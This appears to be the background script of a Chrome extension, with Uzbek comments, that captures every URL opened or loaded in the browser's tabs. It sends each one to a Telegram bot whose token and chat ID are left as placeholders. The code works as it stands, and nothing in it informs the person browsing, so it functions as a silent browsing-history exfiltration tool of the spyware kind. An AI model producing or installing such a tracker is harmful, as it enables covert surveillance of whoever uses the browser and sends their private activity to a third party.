// O'zingizning Telegram bot tokeningizni shu yerga yozing
const BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN";
// O'zingizning chat_id (user yoki group ID) ni yozing
const CHAT_ID = "YOUR_CHAT_ID";

// Tab yangilansa (url o'zgarsa) ishlaydi
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.url) {
    sendToTelegram(changeInfo.url);
  }
});

// Yangi tab ochilganda ham ishlaydi
chrome.tabs.onCreated.addListener((tab) => {
  if (tab.pendingUrl) {
    sendToTelegram(tab.pendingUrl);
  }
});

// Telegramga yuborish funksiyasi
function sendToTelegram(url) {
  const message = `🌐 New URL opened:\n${url}`;
  
  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: message
    }),
  })
  .then(response => {
    if (!response.ok) {
      console.error("Telegram API error:", response.statusText);
    }
  })
  .catch(err => console.error("Fetch error:", err));
}
